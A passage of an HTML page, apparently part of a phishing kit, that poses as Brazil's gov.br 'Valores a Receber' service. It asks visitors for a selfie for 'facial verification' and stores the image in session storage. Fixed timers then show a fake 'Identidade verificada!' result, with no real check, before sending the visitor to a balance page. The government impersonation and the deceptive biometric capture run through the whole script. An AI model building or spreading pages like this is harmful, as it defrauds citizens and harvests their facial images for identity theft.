<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:"DM Sans","Segoe UI",sans-serif;background:#f6f8fb;color:#2b364e;line-height:1.6;font-weight:400;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;display:flex;flex-direction:column;min-height:100vh;min-height:100dvh}
.wrap{flex:1}
h1{font-family:"Manrope","Segoe UI",sans-serif}
button,input{font:inherit}
.govbar{background:#fff;border-bottom:1px solid #dce5df;padding:10px 16px;display:flex;align-items:center;justify-content:flex-start}
.govbar img{height:28px;width:auto;display:block}
.wrap{max-width:460px;margin:0 auto;padding:30px 14px}
.card{background:#fff;border:1px solid rgba(216,229,220,.93);border-radius:21px;padding:34px 24px 27px;box-shadow:0 22px 65px rgba(6,36,81,.09)}
.card h1{font-size:25px;font-weight:700;letter-spacing:-.045em;line-height:1.25;color:#062451;text-align:center}
.sub{margin:8px 0 0;font-size:12px;color:#5f6f68;text-align:center;line-height:1.5}
.moldura{position:relative;width:220px;height:280px;margin:20px auto 8px;border-radius:110px;overflow:hidden;background:#062451;border:3px solid #071D41}
.moldura video,.moldura img{width:100%;height:100%;object-fit:cover;display:block}
.moldura video{transform:scaleX(-1)}
.moldura .guia{position:absolute;inset:0;border-radius:110px;border:2px dashed rgba(255,255,255,.6);pointer-events:none}
.dica{font-size:11px;color:#5f6f68;text-align:center;margin-bottom:6px}
.btn{margin-top:14px;width:100%;min-height:48px;border:0;border-radius:9px;background:#1567f0;color:#fff;font-family:"Manrope",sans-serif;font-size:12px;font-weight:700;letter-spacing:.02em;cursor:pointer;box-shadow:0 7px 14px rgba(21,103,240,.18)}
.btn:hover{background:#0f56d1}
.btn.sec{background:#fff;color:#35644e;border:1px solid #dce8df;box-shadow:none}
.analise{display:none;text-align:center;padding:18px 0 6px}
.analise.show{display:block}
.spinner{width:56px;height:56px;margin:0 auto 14px;border-radius:50%;border:4px solid #dce5df;border-top-color:#1567f0;animation:gira .9s linear infinite}
@keyframes gira{to{transform:rotate(360deg)}}
.analise strong{display:block;font-family:"Manrope",sans-serif;font-size:15px;color:#062451}
.analise small{font-size:12px;color:#5f6f68}
.botoes{display:grid;gap:0}
footer{background:#071D41;padding:20px;text-align:center;margin-top:24px}
footer .govbr-footer{height:26px;width:auto;display:block;margin:0 auto 10px}
footer .copy{font-size:11px;color:#9db1d1}
button:focus-visible,input:focus-visible{outline:3px solid rgba(21,103,240,.35);outline-offset:2px}
@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
</style>
</head>
<body>
<header class="govbar"><img src="govbr.webp" alt="gov.br"></header>
<div class="wrap">
<div class="card">
<h1>Verificação facial</h1>
<p class="sub">Centralize seu rosto na moldura e tire a foto para continuar.</p>
<div class="moldura"><video id="cam" playsinline autoplay muted></video><img id="foto" style="display:none" alt="Sua foto"><span class="guia"></span></div>
<p class="dica" id="dica">Toque em capturar quando estiver pronto.</p>
<div class="botoes" id="areaCaptura">
<button class="btn" id="btnFoto">CAPTURAR FOTO</button>
</div>
<div class="botoes hidden" id="areaConfirma" style="display:none">
<button class="btn" id="btnUsar">USAR ESTA FOTO →</button>
<button class="btn sec" id="btnNova">TIRAR OUTRA</button>
</div>
<div class="analise" id="analise">
<div class="spinner" id="spinLoad"></div>
<div id="okVerif" style="display:none;width:56px;height:56px;margin:0 auto 14px;border-radius:50%;background:#16a34a;color:#fff;font-size:28px;line-height:56px;text-align:center">✓</div>
<strong id="txtAnalise">Analisando identidade...</strong>
<small id="subAnalise">Aguarde a confirmação.</small>
</div>
</div>
</div>
<footer><img class="govbr-footer" src="govbr-branco.png" alt="gov.br"><div class="copy">© 2026 — Consulta de Valores a Receber · Todos os direitos reservados</div></footer>
<script>
var video=document.getElementById('cam'),foto=document.getElementById('foto');
var fotoData='';
function avisa(t){document.getElementById('dica').textContent=t;}
if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false}).then(function(s){
video.srcObject=s;
}).catch(function(){
avisa('Câmera bloqueada. Toque em capturar para enviar um arquivo.');
});
}else{
avisa('Câmera indisponível neste navegador.');
}
document.getElementById('btnFoto').addEventListener('click',function(){
if(video.srcObject){
var c=document.createElement('canvas');c.width=480;c.height=600;
var vw=video.videoWidth||640,vh=video.videoHeight||480,ta=480/600,sa=vw/vh,sw,sh,sx,sy;
if(sa>ta){sh=vh;sw=vh*ta;sx=(vw-sw)/2;sy=0;}else{sw=vw;sh=vw/ta;sx=0;sy=(vh-sh)/2;}
var ctx=c.getContext('2d');ctx.translate(480,0);ctx.scale(-1,1);
ctx.drawImage(video,sx,sy,sw,sh,0,0,480,600);
fotoData=c.toDataURL('image/jpeg',0.7);
foto.src=fotoData;foto.style.display='block';video.style.display='none';
document.getElementById('areaCaptura').style.display='none';
document.getElementById('areaConfirma').style.display='grid';
avisa('Confira sua foto antes de continuar.');
}else{
var i=document.createElement('input');i.type='file';i.accept='image/*';i.capture='user';
i.onchange=function(){
var r=new FileReader();
r.onload=function(){fotoData=r.result;foto.src=fotoData;foto.style.display='block';video.style.display='none';
document.getElementById('areaCaptura').style.display='none';
document.getElementById('areaConfirma').style.display='grid';};
r.readAsDataURL(i.files[0]);
};
i.click();
}
});
document.getElementById('btnNova').addEventListener('click',function(){
fotoData='';foto.style.display='none';
if(video.srcObject){video.style.display='block';}
document.getElementById('areaConfirma').style.display='none';
document.getElementById('areaCaptura').style.display='grid';
avisa('Toque em capturar quando estiver pronto.');
});
document.getElementById('btnUsar').addEventListener('click',function(){
try{sessionStorage.setItem('vr_foto',fotoData);}catch(e){}
document.getElementById('areaConfirma').style.display='none';
document.getElementById('analise').classList.add('show');
avisa('');
setTimeout(function(){
document.getElementById('spinLoad').style.display='none';
document.getElementById('okVerif').style.display='block';
document.getElementById('txtAnalise').textContent='Identidade verificada!';
document.getElementById('subAnalise').textContent='Levando você ao saldo...';
setTimeout(function(){window.location.href='saldo.html';},1400);
},2400);
});
</script>
</body>
</html>
